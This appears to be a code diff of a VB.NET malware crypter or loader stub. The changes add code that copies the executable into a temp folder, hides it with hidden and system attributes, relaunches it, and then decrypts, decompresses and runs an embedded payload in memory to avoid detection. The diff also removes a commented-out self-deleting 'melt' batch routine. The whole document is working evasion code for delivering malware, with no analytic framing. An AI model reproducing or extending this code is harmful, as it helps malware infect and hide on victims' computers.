@@ -6,25 +6,6 @@ Public Class Form1
         Stuff.Test()
     End Sub
 
-
-    'Private Function getmyname(ByVal path As String) As String
-    '    If path.IndexOf("\"c) = -1 Then Return String.Empty
-    '    Return path.Substring(path.LastIndexOf("\"c) + 1)
-    'End Function
-
-    'Sub Melt()
-    '    FileIO.FileSystem.WriteAllText(Application.StartupPath & "\d.bat", "timeout /t 1 >nul" & vbNewLine & "del " & getmyname(Application.ExecutablePath) & ">nul" & vbNewLine & "del d.bat >nul", False)
-
-    '    Dim Strtinfo As New ProcessStartInfo
-    '    Strtinfo.Arguments = ""
-    '    Strtinfo.CreateNoWindow = True
-    '    Strtinfo.FileName = Application.StartupPath & "\d.bat"
-    '    Strtinfo.ErrorDialog = False
-    '    Strtinfo.UseShellExecute = False
-    '    Process.Start(Strtinfo)
-    '    End
-    'End Sub
-
 End Class
 
 
@@ -60,13 +41,22 @@ Class Stuff
                 Dim AppName As String = Strings.Right(AppPath, (AppPath.ToString.Length - AppPath.LastIndexOf("\")))
 
                 'copy our self to temp and re execute
-                FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)
-                'mark new file as system file
-                Dim attribute As System.IO.FileAttributes = IO.FileAttributes.System
-                System.IO.File.SetAttributes(TmpPath & AppName, attribute)
-                'mark new file as hidden file
-                attribute = IO.FileAttributes.Hidden
-                System.IO.File.SetAttributes(TmpPath & AppName, attribute)
+                Try
+                    FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)
+
+                Catch ex As Exception
+                    Try
+                        FileIO.FileSystem.DeleteFile(TmpPath & AppName)
+                        FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)
+
+                    Catch exx As Exception
+                        End
+                    End Try
+                End Try
+
+
+                System.IO.File.SetAttributes(TmpPath & AppName, IO.FileAttributes.Hidden)
+                System.IO.File.SetAttributes(TmpPath & AppName, IO.FileAttributes.System)
                 Process.Start(TmpPath & AppName)
                 'melt
                 If Payload(Start - 12) = &H54 Then
@@ -106,13 +96,14 @@ Class Stuff
         NewByts = Loop1(NewByts, Payload, Start)
         NewByts = Loop2(NewByts)
 
+
+
         If Payload(Start - 16) = &H54 Then
             Dim f As New dll.Class1
             f.Main(Application.ExecutablePath)
         Else
             CMemoryExecute.Run(AES_Decrypt(Decompress(NewByts)), AppPath)
         End If
-
         Process.GetCurrentProcess.Kill()
     End Sub
 
@@ -253,19 +244,6 @@ Class Stuff
             Return Reflection.Assembly.Load(assemblyData)
 
         End Using ' stream
-    End Function
-
-    Private Function ToBytes(ByVal instance As IO.Stream) As Byte()
-        Dim capacity As Integer = If(instance.CanSeek, Convert.ToInt32(instance.Length), 0)
-        Using result As New IO.MemoryStream(capacity)
-            Dim readLength As Integer
-            Dim buffer(4096) As Byte
-            Do
-                readLength = instance.Read(buffer, 0, buffer.Length)
-                result.Write(buffer, 0, readLength)
-            Loop While readLength > 0
-            Return result.ToArray()
-        End Using
     End Function
 
 End Class
